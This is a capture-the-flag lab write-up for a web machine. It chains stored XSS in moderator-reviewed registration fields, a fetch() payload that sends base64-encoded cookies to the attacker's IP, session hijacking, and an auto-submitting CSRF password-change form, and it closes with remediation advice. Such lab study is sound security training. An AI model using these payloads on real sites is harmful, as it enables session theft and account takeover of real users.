## whatsyourname

Medium-difficulty web exploitation machine covering stored XSS, cookie theft, and CSRF against an admin account. The attack chain runs through client-side flaws rather than server-side code execution.

**Target:** 10.48.166.34 (worldwap.thm)
**Attack Vector:** Registration → Stored XSS → Cookie Theft → Session Hijack → CSRF → Admin Access
**Difficulty:** Medium

---

### RECONNAISSANCE

**Port Enumeration**

```
22/tcp    SSH     OpenSSH 8.2p1 Ubuntu
80/tcp    HTTP    Apache 2.4.41 (main site)
8081/tcp  HTTP    Apache 2.4.41 (second web service)
```

**Hosts File Update**

```
10.48.166.34    worldwap.thm
```

The main site presents a login page and a registration page. Registration requires moderator review before an account is active.

---

### ENUMERATION

**Subdomain Discovery**

The login form on the main domain did not work directly. It redirects to a separate host, `login.worldwap.thm`, which was added to the hosts file:

```
10.48.166.34    worldwap.thm login.worldwap.thm
```

The subdomain page renders blank. Its HTML source contains a developer comment:

```html
<!-- login.php should be updated by Monday for proper redirection -->
```

The comment suggests the redirect logic is incomplete and was never fixed.

**Directory Enumeration: Main Domain**

```
gobuster dir -u http://worldwap.thm/ -w <wordlist> -x php,txt,html
```

```
/api            (301)
/public         (301)
/phpmyadmin     (301)
/javascript     (301)
/logs.txt       (200)
```

**Directory Enumeration: login.worldwap.thm**

```
/login.php              (200)
/profile.php            (302 → login.php)
/chat.php               (302 → login.php)
/change_password.php    (302)
/logout.php             (302 → login.php)
/clear.php              (200)
/db.php                 (200)
/setup.php              (200)
/block.php              (200)
/logs.txt               (200)
/assets, /javascript    (301)
/phpmyadmin             (301)
```

Several endpoints redirect unauthenticated users to `login.php`. `change_password.php` is a POST target and becomes relevant during the CSRF stage.

**Registration Behavior**

The main site notes: "You can now pre-register! Your details will be reviewed by the site moderator." This means a person (presumably an admin) reviews submitted profiles. Reviewer activity turns the registration form into a delivery path for client-side payloads.

---

### STORED XSS

**Payload Delivery Test**

A test script tag was submitted in the username, name, email, and password fields:

```html
<script src="http://192.168.136.69/test"></script>
```

A Python HTTP server was started on the attacker machine:

```
python3 -m http.server 80
```

Requests to `/test` returned 404, but the logs confirmed the browser of a reviewer loaded the script from the attacker host. The moderator's browser executes content submitted in profile fields.

**Cookie Exfiltration Payload**

The payload was replaced with one that sends the document cookie to the attacker server, base64-encoded:

```html
<script>
fetch("http://192.168.136.69?cookie=" + btoa(document.cookie), {method: "GET"});
</script>
```

Incoming requests to the listener contained a base64 value in the `cookie` parameter.

---

### SESSION HIJACKING

**Decoding the Stolen Value**

The captured parameter decodes from base64 to a `PHPSESSID` cookie. Setting this cookie in the browser grants the reviewer's authenticated session.

```
PHPSESSID=<decoded session value>
```

Replacing the session cookie provides access to authenticated pages such as `profile.php` and `chat.php`.

---

### CSRF

The password change functionality was identified as a CSRF target. The following page, hosted on the attacker server, submits a hidden POST request to `change_password.php` as soon as it loads, using the victim's session:

```html
<script>
window.onload = function() {
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'ht' + 'tP://' + 'login.worldwap.thm/change_password.php';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'admin';
    input.value = 'hello';
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
};
</script>
```

The victim's browser sends the request with its cookies, so the server applies the change without the victim's intent.

**Authentication as Admin**

After the CSRF request is processed, login with the admin account:

```
Username: admin
Password: admin
```

The admin account is accessible and exposes the flag.

**Flag**

Flag: [not recorded in notes]

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port enumeration (22, 80, 8081)
  ├─ Hosts file update (worldwap.thm)
  └─ Main site and registration review

PHASE 2: Enumeration
  ├─ Discover login.worldwap.thm
  ├─ Developer comment in source
  └─ Directory enumeration on both hosts

PHASE 3: Stored XSS
  ├─ Test payload in registration fields
  ├─ Confirm moderator browser loads attacker script
  └─ Deploy cookie-exfiltration payload

PHASE 4: Session Hijacking
  ├─ Receive base64-encoded PHPSESSID
  ├─ Decode and set session cookie
  └─ Authenticated access as moderator

PHASE 5: CSRF
  ├─ Identify change_password.php as target
  ├─ Host auto-submitting form on attacker server
  └─ Trigger via moderator session

PHASE 6: Admin Access
  ├─ Log in as admin
  └─ Retrieve flag
```

---

### VULNERABILITIES

1. **Stored XSS in Registration Fields (High)**
   - Profile fields are rendered unsanitized to the moderator
   - Arbitrary JavaScript executes in the reviewer's browser

2. **Session Cookie Exposure (High)**
   - PHPSESSID is readable by JavaScript (`httponly` flag not set)
   - Cookie can be exfiltrated and reused

3. **Missing CSRF Protection (High)**
   - `change_password.php` accepts cross-origin POST requests without a token
   - No SameSite cookie attribute to block cross-site submission

4. **Weak Admin Credentials (Critical)**
   - Admin account uses a trivial password

5. **Information Disclosure (Low)**
   - Developer comments left in production HTML
   - Exposed `logs.txt`, `db.php`, and `setup.php` endpoints

---

### REMEDIATION

```
├─ Encode all user-supplied output (context-aware escaping)
├─ Apply a strict Content-Security-Policy to block inline and external scripts
├─ Set HttpOnly, Secure, and SameSite=Strict on session cookies
├─ Require anti-CSRF tokens on all state-changing POST requests
├─ Enforce strong admin credentials and rotate any default accounts
├─ Remove developer comments, debug files, and exposed config endpoints
└─ Review moderator workflows so reviewers do not render untrusted content in an authenticated context
```

---

### TECHNICAL NOTES

**Tools Used:**
- nmap (port and service enumeration)
- gobuster (directory discovery)
- Burp Suite (request inspection)
- Python HTTP server (payload delivery and callback capture)
- Browser developer tools (cookie inspection)

**Key Insight:** Stored XSS in a moderator-reviewed form turned a registration into a session-theft vector. A stolen session plus an unprotected password endpoint allowed account takeover without knowing any credentials.
